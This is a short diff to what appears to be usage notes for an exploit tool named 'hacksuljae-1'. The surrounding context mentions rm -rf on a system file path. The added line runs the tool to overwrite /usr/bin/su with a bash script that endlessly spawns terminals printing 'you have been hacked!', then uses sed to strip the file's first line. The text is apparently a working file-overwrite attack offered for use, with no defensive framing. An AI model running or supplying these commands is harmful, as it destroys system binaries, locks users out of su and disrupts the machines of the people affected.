@@ -14,3 +14,5 @@ rm -rf "시스템파일 경로"
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ./hacksuljae-1 /home/test/Desktop/test.bat 1 $'#!/bin/bash\nwhile true; do\ngnome-terminal -- bash -c \'echo \"you have been hacked!\"; read -p \"Press Enter to continue or \"\'\ndone\n//' && sed -i '1d' /home/test/Desktop/test.bat
+
+./hacksuljae-1 /usr/bin/su 1 $'#!/bin/bash\nwhile true; do\ngnome-terminal -- bash -c \'echo \"you have been hacked!\"; read -p \"Press Enter to continue or \"\'\ndone\n//' && sed -i '1d' /usr/bin/su
